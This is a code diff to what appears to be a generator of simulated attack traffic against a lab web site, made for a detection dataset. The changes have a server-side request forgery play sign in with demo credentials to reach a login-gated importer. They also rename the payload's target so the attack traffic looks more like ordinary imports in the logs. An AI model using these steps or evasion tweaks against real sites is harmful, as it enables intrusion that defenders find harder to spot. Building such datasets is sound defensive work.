@@ -30,6 +30,8 @@ Stdlib only.
 
 from typing import NamedTuple
 
+from shared.clients.personas import SITE
+
 
 class AttackStep(NamedTuple):
     method: str
@@ -503,7 +505,14 @@ def forced_browsing(rng, style, known):
     ]:
         outcome = yield step
         reachable = reachable or _answered(outcome)
-    return frozenset({"admin_reachable"}) if reachable else frozenset()
+    # It signed in, so it holds a session the next play does not have to work
+    # out for itself. `ssrf` reads this: the importer is session-gated, and one
+    # operator signing in twice in one campaign is not a shape a reader of the
+    # log could account for.
+    facts = {"session"}
+    if reachable:
+        facts.add("admin_reachable")
+    return frozenset(facts)
 
 
 def verb_tampering(rng, style, known):
@@ -602,9 +611,27 @@ def ssrf(rng, style, known):
     and metadata attempts fail at the network layer. The attempt is the part
     that lands in the dataset, and recognising it is the skill -- so those are
     sent whether or not the baseline proved the importer fetches anything.
+
+    The importer is behind `require_login()` and nothing else. That is exactly
+    weakness 4 -- no role check, but a session all the same -- so an anonymous
+    run is redirected away from every step and carries no evidence of SSRF at
+    all. The operator signs in with the customer account it holds, unless an
+    earlier play in the campaign already did.
+
+    The baseline names this site the way its own pages do. Naming it by the
+    address the container answers on put a literal IP in a parameter, which is
+    the one marker separating the payloads below from an ordinary import.
     """
+    if "session" not in known:
+        yield AttackStep("GET", "/login", "authentication", "signin", 2.5,
+                         note="the importer wants a session, not a role")
+        if not _signed_in((yield AttackStep(
+                "POST", "/login", "authentication", "signin", 2.0,
+                body="username=demo&password=demo123"))):
+            return frozenset()
+
     baseline = yield AttackStep("GET", "/admin/import-image?url=" + _q(
-        "http://203.0.113.2/assets/css/site.css"), "ssrf", "ssrf", 4.0,
+        f"{SITE}/assets/css/site.css"), "ssrf", "ssrf", 4.0,
         note="baseline: a URL it is supposed to fetch")
     fetches = _shows(baseline, "Fetched")
 
@@ -622,7 +649,10 @@ def ssrf(rng, style, known):
                    "ssrf", "ssrf", 4.0, note="scheme confusion"),
     ]:
         yield step
-    return frozenset({"ssrf_confirmed"}) if fetches else frozenset()
+    facts = {"session"}
+    if fetches:
+        facts.add("ssrf_confirmed")
+    return frozenset(facts)
 
 
 # ---------------------------------------------------------------------------
